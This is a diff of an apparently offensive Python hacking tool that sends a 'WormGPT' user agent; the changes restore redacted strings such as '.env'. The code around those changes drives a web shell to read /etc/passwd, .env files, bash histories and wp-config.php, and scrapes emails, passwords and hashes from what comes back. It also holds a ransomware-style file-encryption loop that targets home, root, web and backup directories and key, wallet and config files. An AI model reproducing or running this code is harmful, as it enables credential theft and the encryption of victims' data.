@@ -553,7 +553,7 @@ class ChiasmodonOSINT:
             return common_breaches[email]
         
         # Optional: Use HIBP API if key is set
-        hibp_api_key = os***REMOVED***iron.get("HIBP_API_KEY", "")
+        hibp_api_key = os.environ.get("HIBP_API_KEY", "")
         if use_hibp and hibp_api_key:
             try:
                 headers = {"hibp-api-key": hibp_api_key, "User-Agent": "WormGPT"}
@@ -1353,7 +1353,7 @@ def capture_and_dehash(target, session, shell_url=None):
     creds = {"emails":[], "passwords":[], "hashes":[]}
     if shell_url:
         try:
-            cmd = "cat /etc/passwd /var/www/html/***REMOVED*** /home/*/.bash_history /root/.bash_history /var/www/html/wp-config.php 2>/dev/null"
+            cmd = "cat /etc/passwd /var/www/html/.env /home/*/.bash_history /root/.bash_history /var/www/html/wp-config.php 2>/dev/null"
             resp = session.get(shell_url, params={'c': cmd}, timeout=10)
             content = resp.text
             creds["emails"] = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
@@ -1637,7 +1637,7 @@ def encrypt_file(path):
     except:
         return False
 TARGET_DIRS = ["/home","/root","/var/www","/opt","/etc","/tmp","/usr/local","/backup"]
-TARGET_EXTS = [".txt",".doc",".docx",".pdf",".jpg",".png",".zip",".sql",".db",".conf",".config",".ini",".json",".key",".pem",".crt","***REMOVED***",".log",".bak",".wallet"]
+TARGET_EXTS = [".txt",".doc",".docx",".pdf",".jpg",".png",".zip",".sql",".db",".conf",".config",".ini",".json",".key",".pem",".crt",".env",".log",".bak",".wallet"]
 total = 0
 hostname = os.uname().nodename if hasattr(os, 'uname') else "unknown"
 for d in TARGET_DIRS:
